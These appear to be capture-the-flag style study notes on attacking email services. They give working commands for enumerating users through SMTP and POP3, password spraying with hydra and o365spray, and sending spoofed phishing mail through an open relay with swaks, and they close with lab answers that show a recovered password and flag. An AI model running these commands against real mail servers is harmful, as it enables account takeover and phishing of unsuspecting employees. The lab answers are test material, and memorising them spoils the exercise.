Attacking Email Services: Study Notes
Core idea

A mail server handles and delivers email over a network. Three main protocols:
Protocol 	Role 	Default behavior
SMTP 	Sends email client → server and server → server 	—
POP3 	Downloads email to client 	Removes messages from server after download (one device)
IMAP4 	Downloads email to client 	Keeps messages on server (multi-device friendly)

Attack approach depends on the service: cloud providers (Microsoft 365, G-Suite, Zoho) use modern auth and custom implementations → unique attack vectors per provider. Self-hosted/custom mail servers → classic misconfigurations and protocol-level attacks.
Enumeration
Step 1: Find the mail server via MX records

host -t MX hackthebox.eu
dig mx inlanefreight.com | grep "MX" | grep -v ";"

MX records tell you which service the company uses:

    aspmx.l.google.com → G-Suite
    *.mail.protection.outlook.com → Microsoft 365
    *.zoho.com → Zoho
    A custom hostname (e.g., mail1.inlanefreight.com) → self-hosted

Then resolve the mail server's A record:

host -t A mail1.inlanefreight.htb

Step 2: Scan email ports (custom servers)

sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Port 	Service
TCP/25 	SMTP (unencrypted)
TCP/143 	IMAP4 (unencrypted)
TCP/110 	POP3 (unencrypted)
TCP/465 	SMTP (encrypted)
TCP/587 	SMTP (encrypted / STARTTLS)
TCP/993 	IMAP4 (encrypted)
TCP/995 	POP3 (encrypted)
Misconfigurations: User Enumeration

SMTP supports commands that can confirm whether a username exists on the server — useful before password spraying.
VRFY — checks if a single user exists

telnet 10.10.110.20 25
VRFY root           → 252 (exists)
VRFY new-user       → 550 (unknown)

EXPN — expands a distribution list (can expose all members)

EXPN support-team
→ 250 carol@inlanefreight.htb
→ 250 elisa@inlanefreight.htb

More dangerous than VRFY — aliases like "all" can dump a full user list.
RCPT TO — attempts to set an email recipient; valid users get a 250 OK

MAIL FROM:test@htb.com
RCPT TO:julio    → 550 (unknown)
RCPT TO:john     → 250 (exists)

POP3 — USER command

telnet 10.10.110.20 110
USER julio    → -ERR (doesn't exist)
USER john     → +OK (exists)

Automate with smtp-user-enum

smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Flag 	Meaning
-M 	Mode: VRFY, EXPN, or RCPT
-U 	Username list file
-D 	Domain to append to usernames
-t 	Target host
Cloud Enumeration (Office 365)

O365spray — username enumeration and password spraying tool for Microsoft O365.

Step 1: Validate the domain uses O365:

python3 o365spray.py --validate --domain msplaintext.xyz

Step 2: Enumerate valid usernames:

python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

Valid accounts saved to a file automatically.
Password Attacks
Hydra — password spray/brute force (SMTP, POP3, IMAP4)

hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

    -L = username list, -p = single password, -f = stop on first success

Note: cloud providers often block generic tools like Hydra. Use service-specific tools instead:
Service 	Tool
Microsoft 365 	o365spray, MailSniper
Gmail / Okta 	CredKing

Important: these tools change as providers update their APIs — you must understand what your tools are doing so you can fix or adapt them when they break.
O365spray — password spraying

python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

Flag 	Meaning
--spray 	Password spray mode
-U 	Confirmed valid users file
-p 	Password to spray
--count 	Passwords per spray round
--lockout 	Minutes to wait between rounds (avoids lockouts)
--safe 	Stops if X accounts lock out
Protocol-specific attacks: Open Relay

An open relay is an SMTP server misconfigured to accept and forward email from any source without authentication. It hides where the email actually came from, making it appear to originate at the relay server — perfect for phishing using a trusted domain name.

Detect with Nmap:

nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Output: Server is an open relay (14/16 tests) — confirmed vulnerable.

Exploit with swaks (send a spoofed phishing email):

swaks --from notifications@inlanefreight.com \
      --to employees@inlanefreight.com \
      --header 'Subject: Company Notification' \
      --body 'Hi All, please complete this survey: http://mycustomphishinglink.com/' \
      --server 10.10.11.213

Flag 	Meaning
--from 	Spoofed sender address
--to 	Target recipient
--header 	Email subject line
--body 	Email body content
--server 	The open relay's IP

The email arrives looking like it came from the company's own notification address — employees have no obvious reason to distrust it.
Pentester's quick checklist

    Look up MX records (host -t MX / dig mx) — identify cloud vs. self-hosted
    If self-hosted: nmap -p25,110,143,465,587,993,995 to fingerprint services
    Try user enumeration via VRFY, EXPN, RCPT TO (telnet or smtp-user-enum)
    If POP3 exposed: try USER <name> for user confirmation
    If O365: validate domain with o365spray --validate, then enumerate with --enum
    With a valid user list, password spray (Hydra for self-hosted; o365spray/MailSniper/CredKing for cloud)
    Check for open relay: nmap --script smtp-open-relay
    If open relay confirmed: abuse with swaks for spoofed phishing emails

One-line summary

    Email attacks come in three flavours: enumerate users via SMTP/POP3 commands or cloud-specific tools, spray passwords once you have valid usernames, and abuse open relays to send spoofed phishing emails that look like they came from the company itself.

Question 1
What is the available username for the domain inlanefreight.htb in the SMTP server?
> ./smtp-user-enum -m RCPT -U ~/Downloads/users.list -d inlanefreight.htb 10.129.203.12 25
[SUCC] marlin        250 OK

Question 2
Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.
> hydra -l 'marlin@inlanefreight.htb' -P ~/Downloads/passwords.list -f 10.129.203.12 pop3
[110][pop3] host: 10.129.203.12   login: marlin@inlanefreight.htb   password: poohbear
> telnet 10.129.203.12 143
1 login "marlin@inlanefreight.htb" "poohbear"
2 select "INBOX"
3 FETCH 1 BODY[]
  flag: HTB{w34k_p4$$w0rd}
